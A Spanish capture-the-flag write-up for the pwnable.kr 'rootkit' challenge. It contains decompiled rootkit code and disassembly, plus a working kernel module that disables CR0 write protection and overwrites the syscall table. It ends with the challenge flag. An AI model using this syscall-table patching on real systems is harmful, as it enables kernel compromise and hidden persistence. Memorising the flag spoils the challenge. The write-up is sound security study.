# rootkit

![img](https://raw.githubusercontent.com/Calana2/Writeups/main/pwnable.kr/Grotesque/rootkit.png)

En un sistema emulado con QEMU en el cual somos root no podemos leer la flag:
```
ls
bin         etc         lib         lost+found  sbin        usr
dev         flag        linuxrc     rootkit.ko  tmp         var
/ # uname -r
3.7.1
/ # uname -a
Linux (none) 3.7.1 #1 SMP Mon Dec 23 06:07:19 PST 2013 i686 GNU/Linux
/ # id
uid=0 gid=0 groups=0
/ # cat flag
[   94.886978] You will not see the flag...
cat: can't open 'flag': Operation not permitted
/ #
```

El causante de esto es el modulo `rootkit.ko` que reemplazó las entradas en la `SYSCALL_TABLE` de `sys_open`, `sys_openat`, `sys_symlink`, `sys_symlinkat`, `sys_link`, `sys_linkat`, `sys_rename` y `sys_renameat` por hooks:
```C
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 init_module(void)

{
  int iVar1;
  
  system_call_table = -0x3ea05fe0;
  sys_open = _DAT_c15fa034;
  sys_openat = _DAT_c15fa4bc;
  sys_symlink = _DAT_c15fa16c;
  sys_symlinkat = _DAT_c15fa4e0;
  sys_link = _DAT_c15fa044;
  sys_linkat = _DAT_c15fa4dc;
  sys_rename = _DAT_c15fa0b8;
  sys_renameat = _DAT_c15fa4d8;
  wp(0);
  iVar1 = system_call_table;
  *(code **)(system_call_table + 0x14) = sys_open_hoo ked;
  *(code **)(iVar1 + 0x49c) = sys_openat_hooked;
  *(code **)(iVar1 + 0x14c) = sys_symlink_hooked;
  *(code **)(iVar1 + 0x4c0) = sys_symlinkat_hooked;
  *(code **)(iVar1 + 0x24) = sys_link_hooked;
  *(code **)(iVar1 + 0x4bc) = sys_linkat_hooked;
  *(code **)(iVar1 + 0x98) = sys_rename_hooked;
  *(code **)(iVar1 + 0x4b8) = sys_renameat_hooked;
  wp(1);
  *(undefined4 *)(__this_module._4_4_ + 4) = __this_mo dule._8_4_;
  *(undefined4 *)__this_module._8_4_ = __this_module. _4_4_;
  __this_module._4_4_ = 0x105a4;
  __this_module._8_4_ = 0x105a4;
  return 0;
}
```

Los hooks usan `strstr` para comprobar que si el `pathname` que usas contiene "flag.txt", la operación falle, y muestre un mensaje del kernel. Con esto no podemos hacer `cat`, `mv`, `cp` o `ln` sobre la flag.

Otra idea que puedes tener es crear un patch, desmontar `rootkit.ko` con `rmmod` e insertar la version modificada con `insmod`. El problema con esto es que `rmmod` (y `modprobe`) leen `/proc/modules` para ver los modulos Live, pero en el reto `/proc` ni siquiera esta montado. Por otro lado cambiar el nombre del modulo de `rootkit.ko` hace que el kernel se queje de que el modulo esta "truncado", no estoy seguro por qué ocurre esto.

Finalmente la última opción es [compilar un módulo nuevo](https://askubuntu.com/questions/1225107/how-to-compile-against-kernel-headers) e insertarlo para restaurar al menos la syscall `open`. Puesto que el módulo debe ser compilado contra exactamente la misma versión del kernel (que no nos brindan) me fue realmente complicado encontrar la forma correcta.

Necesitaba los headers para linux-3.7.1 de 32 bits. En los repositorios viejos de ubuntu y otras distribuciones no pude encontrar esta version:
- https://askubuntu.com/questions/1195069/how-can-i-get-kernel-3-7-1-header-files-in-ubuntu-16-04-x32
- https://www.ubuntubuzz.com/2012/12/how-to-install-linux-kernel-371-on.html

Al final no me quedó de otra que compilar a partir del código fuente yo mismo: https://cdn.kernel.org/pub/linux/kernel/v3.x/linux-3.7.1.tar.gz

Probé primero en una Ubuntu Xenial 16.04 pero al intentar construir lo necesario con `make` recibí varios errores debido a la toolchain usada (`gcc` y `perl` muy modernos): https://stackoverflow.com/questions/41980796/cant-use-definedarray-warning-in-converting-obj-to-h

Al final opté por esta vía:
- Virtualizar una [imagen de Ubuntu 13.04](http://old-releases.ubuntu.com/releases/raring/ubuntu-13.04-desktop-i386.iso) (kernel 3.8.0): 
- Descargar [el codigo fuente del kernel 3.7.1]( https://cdn.kernel.org/pub/linux/kernel/v3.x/linux-3.7.1.tar.gz)
- Descargar un [paquete generico que aun existe en Internet](https://web.archive.org/web/20170927195456/http://kernel.ubuntu.com/%7Ekernel-ppa/mainline/v3.7.1-raring/linux-headers-3.7.1-030701-generic_3.7.1-030701.201212171620_i386.deb)
- Instalar el paquete .deb con `dpkg -i`
- Desempaquetar `linux-3.7.1.tar.gz`
- Copiar `/lib/modules/3.8.1-generic/.config` a `linux-3.7.1`.
- Actualizar los repositorios:
```
# /etc/apt/sources.list
deb http://old-releases.ubuntu.com/ubuntu/ raring main restricted universe multiverse
deb http://old-releases.ubuntu.com/ubuntu/ raring-updates main restricted universe multiverse
deb http://old-releases.ubuntu.com/ubuntu/ raring-security main restricted universe multiverse
deb http://old-releases.ubuntu.com/ubuntu/ raring-backports main restricted universe multiverse
```
- Instalar `make`
- Eecutar `make` en `linux-3.7.1` para contruir el kernel completo
- Crear un modulo .c y un `Makefile` para compilar usando las nuevas cabeceras.
 
Las versiones de `gcc` (4.7.3) y `perl` (~5.14) eran las correctas sin embargo este proceso fue necesario porque:
- Usar `make defconfig` no generaba "modversions" y actualizar el `.config` para hacer `CONFIG_MODVERSIONS=y` producia el mismo error por falta de `Module.symvers`.: https://askubuntu.com/questions/14627/no-symbol-version-for-module-layout-when-trying-to-load-usbhid-ko
- A pesar de usar correctamente esto, contruir solo lo necesario con `make prepare`, `make modules_prepare`, `make modules` y `make headers_install` generaba otro error porque la minima diferencia en las configuraciones en un modulo externamente construido hace que falle la insercion tal y como se explica en https://github.com/lwfinger/rtl8188eu/issues/102 y https://stackoverflow.com/questions/2720177/module-layout-version-incompatibility

Para sobreescribir la pagina en donde esta la syscall table necesitamos primero deshabilitar el WriteProtect (WP) bit en el registro de control `c0` tal y como hace el rootkit:
```C
/ 43: sym.wp ();
|           0x08000300      55             push ebp
|           0x08000301      89e5           mov ebp, esp
|           0x08000303      e8fcffffff     call mcount                 ; RELOC 32 mcount
|           0x08000308      83f801         cmp eax, 1                  ; 1
|       ,=< 0x0800030b      7413           je 0x8000320
|       |   0x0800030d      50             push eax
|       |   0x0800030e      0f20c0         mov eax, cr0
|       |   0x08000311      25fffffeff     and eax, 0xfffeffff
|       |   0x08000316      0f22c0         mov cr0, eax
|       |   0x08000319      58             pop eax
|       |   0x0800031a      5d             pop ebp
|       |   0x0800031b      c3             ret
..
|       |   ; CODE XREF from sym.wp @ 0x800030b(x)
|       `-> 0x08000320      50             push eax
|           0x08000321      0f20c0         mov eax, cr0
|           0x08000324      0d00000100     or eax, 0x10000
|           0x08000329      0f22c0         mov cr0, eax
|           0x0800032c      58             pop eax
|           0x0800032d      5d             pop ebp
\           0x0800032e      c3             ret
```

Para encontrar la direccion original de `sys_open` usamos `kallysyms_lookup_open`. En `Module.symvers` vemos que `kallysyms_lookup_open` aparece como `EXPORT_SYMBOL_GPL`, necesita declararse la licencia del modulo para usarlo.

pwn.c:
```C
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>

unsigned long sys_open;  // 0xc1158d70
#define SYS_CALL_TABLE ((void **)0xc15fa020)
#define SYS_OPEN 5

MODULE_LICENSE("GPL");  // needed for kallsyms_lookup_name

int init_module(void) {
  printk(KERN_INFO "Hello\n");

  // get sys_open address
  sys_open = kallsyms_lookup_name("sys_open");
  printk(KERN_INFO "sys_open address: 0x%lx\n", sys_open);

  // overwrite syscall_table entry for sys_open hooked
  __asm__ (
   ".intel_syntax noprefix;"
   "mov eax, cr0;"
   "and eax, 0xfffeffff;"
   "mov cr0, eax;"
   ".att_syntax;"
  );

  SYS_CALL_TABLE[SYS_OPEN] = (void*)sys_open;
  
  // Not necesary, only for consistency
  __asm__ (
   ".intel_syntax noprefix;"
   "mov eax, cr0;"
   "or eax, 0x10000;"
   "mov cr0, eax;"
   ".att_syntax;"
  );

  printk(KERN_INFO "Job done\n");
  return 0;
}

void cleanup_module(void) { } 
```

Makefile:
```make
obj-m += pwn.o

KDIR := /home/rootkit/linux-3.7.1
PWD  := $(shell pwd)

all:
        $(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
        $(MAKE) -C $(KDIR) M=$(PWD) clean
```

`R0otK1tty_Swe3ty_KittY`